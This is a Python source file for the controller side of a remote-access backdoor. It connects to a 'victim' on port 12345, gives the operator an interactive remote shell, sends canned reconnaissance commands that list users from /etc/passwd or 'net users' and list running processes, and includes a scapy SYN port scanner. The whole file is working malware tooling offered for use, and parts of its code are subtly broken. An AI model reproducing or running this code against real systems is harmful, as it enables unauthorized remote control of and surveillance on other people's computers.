from scapy.layers.inet import IP, TCP
from scapy.all import *
import socket
import argparse


class Shell:

    def __init__(self):
        self._history = []
        self._command = ""
        self._next_command = True

    def send(self):
        self._history.append(self._command)
        s.send(self._command.encode("utf-8"))

    def receive(self):
        content = s.recv(4096).decode("utf-8")
        if content[2:] == "cd":
            malware_os.chdir(self._command[3:].decode("utf-8"))
        print(content)

    def history(self):
        print("The history of your commands is:")
        print("----------------------")
        for element in self._history:
            print(element)

    def close(self):
        self._next_command = False

    def get_command(self):
        return self._command

    def set_command(self, command):
        self._command = command

    def get_next_command(self):
        return self._next_command

    def set_next_command(self, next_command):
        self._next_command = next_command


class GetInfo:

    def __init__(self, malware_os):
        self._os = malware_os

    # List users
    def get_users(self):
        if self._os == "Windows":
            return "net users"
        elif self._os == "Linux":
            return "cut -d: -f1 /etc/passwd"

    # list directory content
    def get_content(self):
        if self._os == "Windows":
            return "dir"
        elif self._os == "Linux":
            return "ls"

    # list running Process
    def list_process(self):
        if self._os == "Windows":
            return "tasklist /FI \"STATUS eq running\""
        elif self._os == "Linux":
            return "ps -A"

    # Make a screenshot
    def screenshot(self):
        pass


class PortScanner:

    def scanner(self):

        address = input("[*] Enter the address to scan: ")
        print("[*] To enter a range give the minimum and maximum port number. To scan a specific port enter twice the "
              "same number.")
        min_port = input("[*] Enter de minimum port number: ")
        max_port = input("[*] Enter the Maximum port Number: ")

        print("[*] Scan started!\n")
        t1 = datetime.now()
        for port in range(int(min_port), int(max_port) + 1):
            resp = sr1(IP(dst=address) / TCP(dport=port, flags="S"), verbose=0)
            if TCP in resp:
                if resp[TCP].flags == "SA":
                    print("Port {}".format(port) + " is open")
        t2 = datetime.now()
        final_time = t2 - t1
        print("\n[*] Scan finished!")

        print("[*] Scanning completed in {}".format(final_time))


parser = argparse.ArgumentParser()
parser.add_argument("-a", "--address", metavar="", type=str, help="Enter the IP address to connect to")
args = parser.parse_args()
address_option = args.address

if address_option is None:
    malware_addr = input("[*] Enter the address of the victim: ")
else:
    malware_addr = address_option
serv_addr = (malware_addr, 12345)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect(serv_addr)
except socket.error:
    print("[!] Unable to connect to the following address: {}".format(malware_addr))
    sys.exit(0)
print(s.recv(4096).decode('utf-8'))
s.send("os".encode("utf-8"))
malware_os = s.recv(4096).decode('utf-8')

getinfo = GetInfo(malware_os)
shell = Shell()

print("----------------------")
message = input(
    "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the "
    "PortScanner.\n4. Type exit to quit\n\nAnswer: ")
print("\n----------------------")

while message != "exit":
    if message == "1":
        shell.set_next_command(True)
        while shell.get_next_command():
            shell._command = input("Shell: ")
            while shell.get_command() == "":
                shell.set_command(input("Shell: "))
            if shell.get_command() == "exit":
                shell.close()
            if shell.get_command() == "history":
                shell.history()
            else:
                shell.send()
                shell.receive()
    elif message == "2":
        print("[*] List of Users")
        shell.set_command(getinfo.get_users())
        shell.send()
        shell.receive()
        print("----------------------")
        print("[*] Directory Content")
        shell.set_command(getinfo.get_content())
        shell.send()
        shell.receive()
        print("----------------------")
        print("[*] list Running Process")
        shell.set_command(getinfo.list_process())
        shell.send()
        shell.receive()


    elif message == "3":
        scan = PortScanner()
        scan.scanner()

    print("\n----------------------")
    message = input(
        "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the "
        "PortScanner.\n4. Type exit to quit\n\nAnswer: ")
print("\n----------------------")

s.close()
